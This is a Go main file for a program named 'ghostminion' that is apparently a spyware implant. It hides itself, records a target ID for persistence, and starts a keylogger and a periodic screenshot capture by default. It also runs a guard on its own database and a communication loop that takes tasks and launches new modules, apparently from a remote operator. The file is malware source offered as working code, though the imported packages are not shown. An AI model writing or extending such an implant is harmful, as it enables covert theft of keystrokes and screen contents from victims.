package main

import (
	"ghostminion/apps"
	"ghostminion/communication"
	"ghostminion/config"
	"ghostminion/db"
	"ghostminion/hider"
	"ghostminion/logger"
	"ghostminion/persistence"
)

func main() {
	configInstance := config.GetInstance()

	db.GetInstance()

	lgr := logger.GetLogger()
	defer func(log *logger.Logger) {
		_ = log.Close() //TODO: do not ignore this error
	}(lgr)

	hider.Hide()

	targetId := persistence.GeTargetID()
	err := configInstance.Update(func(c *config.Config) {
		c.AgentID = targetId
	})
	if err != nil {
		lgr.Error("Error updating agent ID: " + err.Error())
	}

	lgr.Debug("targetId: %s", targetId)

	appManager := apps.GetAppManagerInstance()
	appManager.StartApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})

	appManager.StartApp(string(apps.ScreenShotTask)+"_default", apps.NewScreenshotApp(
		configInstance.Apps.Screenshot["Interval"].(int),
		configInstance.Apps.Screenshot["Quality"].(int),
	))
	appManager.StartApp("security_guard", &apps.SecurityGuardApp{
		FilesExistence: []string{
			configInstance.Installation.DBPath,
		},
	})

	taskCh := make(chan apps.AppData)
	go communication.Routine(taskCh)
	// TODO: should be done in the task/app manager
	for task := range taskCh {
		// TODO: handle config change
		if app, err := apps.NewAppFactory(task); err != nil {
			lgr.Warn("could not make app from task err: %s", err.Error())
		} else {
			appManager.StartApp(task.Name, app)
		}
	}

	appManager.StopAll()
}
